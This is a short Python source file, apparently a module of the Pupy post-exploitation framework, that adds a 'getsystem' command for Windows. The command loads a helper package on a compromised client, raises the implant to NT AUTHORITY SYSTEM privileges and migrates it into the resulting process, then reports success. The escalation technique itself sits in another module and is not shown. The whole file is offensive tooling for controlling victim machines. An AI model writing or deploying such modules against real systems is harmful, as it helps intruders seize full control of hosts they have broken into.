# -*- coding: UTF8 -*-
from pupylib.PupyModule import *
from pupylib.utils.rpyc_utils import redirected_stdo
from modules.lib.windows.migrate import migrate
__class_name__="GetSystem"

@compatibility("windows")
class GetSystem(PupyModule):
	""" try to get NT AUTHORITY SYSTEM privileges """

	def init_argparse(self):
		self.arg_parser = PupyArgumentParser(prog="getsystem", description=self.__doc__)

	def run(self, args):
		self.client.load_package("pupwinutils.getsystem")
		with redirected_stdo(self.client.conn):
			proc_pid=self.client.conn.modules["pupwinutils.getsystem"].getsystem()
		migrate(self, proc_pid)
		self.success("[+] got system !")

